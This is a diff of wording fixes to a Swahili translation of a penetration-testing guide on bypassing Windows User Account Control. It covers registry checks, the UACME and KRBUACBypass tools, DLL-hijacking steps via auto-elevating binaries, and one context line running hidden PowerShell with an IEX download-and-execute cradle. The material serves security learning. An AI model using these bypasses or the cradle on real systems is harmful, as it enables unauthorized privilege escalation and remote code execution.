@@ -24,7 +24,7 @@ Get Access Today:
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuathiri mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.
 
 Kwa maelezo zaidi kuhusu viwango vya integrity:
 
@@ -53,7 +53,7 @@ Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection
 
 Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary lazima iwe **imewekwa saini na Microsoft** pia.
 
-Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** cha integrity **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwa **mchakato wa integrity wa kiwango cha Juu**.
+Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** cha integrity **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwa **mchakato wa integrity wa kiwango cha juu**.
 
 Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
 
@@ -66,7 +66,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Ikiwa ni **`1`** basi UAC ime **aktivishwa**, ikiwa ni **`0`** au haipo, basi UAC ni **isiyokuwa na shughuli**.
+Ikiwa ni **`1`** basi UAC ni **imewashwa**, ikiwa ni **`0`** au haipo, basi UAC ni **haijawashwa**.
 
 Kisha, angalia **ni kiwango gani** kimewekwa:
 ```
@@ -76,8 +76,8 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 * Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
-* Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili la binary kwa haki za juu (katika Desktop Salama)
-* Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
+* Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
+* Ikiwa **`2`** (**Nijulishe kila wakati**) UAC kila wakati itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
 * Ikiwa **`3`** kama `1` lakini si lazima kwenye Desktop Salama
 * Ikiwa **`4`** kama `2` lakini si lazima kwenye Desktop Salama
 * ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu
@@ -105,7 +105,7 @@ whoami /groups | findstr Level
 ## UAC bypass
 
 {% hint style="info" %}
-Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ombi la UAS linapojitokeza
+Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana
 {% endhint %}
 
 UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.
@@ -157,12 +157,12 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### KRBUACBypass
 
-Hati na chombo katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
-Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maombi mengine** ambayo yatamwonya **mtumiaji** kwamba kuna kitu kinatokea.
+[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
+Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.
 
 UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
 ```
@@ -188,7 +188,7 @@ You can get using a **meterpreter** session. Migrate to a **process** that has t
 
 Ikiwa una ufikiaji wa **GUI unaweza tu kukubali ujumbe wa UAC** unapoupata, huwezi kweli kuhitaji bypass. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kupita UAC.
 
-Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akikitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zinaendesha kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **siri** zaidi.
+Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zinaendesha kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.
 
 ### Noisy brute-force UAC bypass
 
@@ -198,16 +198,16 @@ Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**
 
 Ikiwa utaangalia **UACME** utaona kwamba **mara nyingi UAC bypasses inatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).
 
-1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba wakati inatekelezwa inafanya kazi katika kiwango cha juu cha uaminifu).
+1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba wakati inatekelezwa inakimbia katika kiwango cha juu cha uaminifu).
 2. Kwa procmon pata matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
 3. Huenda ukahitaji **kuandika** DLL ndani ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hii kwa kutumia:
-1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
-2. **IFileOperation**: Windows 10.
+   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
+   2. **IFileOperation**: Windows 10.
 4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojiongezea.
 
 ### Another UAC bypass technique
 
-Inajumuisha kuangalia ikiwa **binary autoElevated** inajaribu **kusoma** kutoka **registry** jina/njia ya **binary** au **amri** inayopaswa **kutekelezwa** (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
+Inahusisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka **registry** jina/path ya **binary** au **amri** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
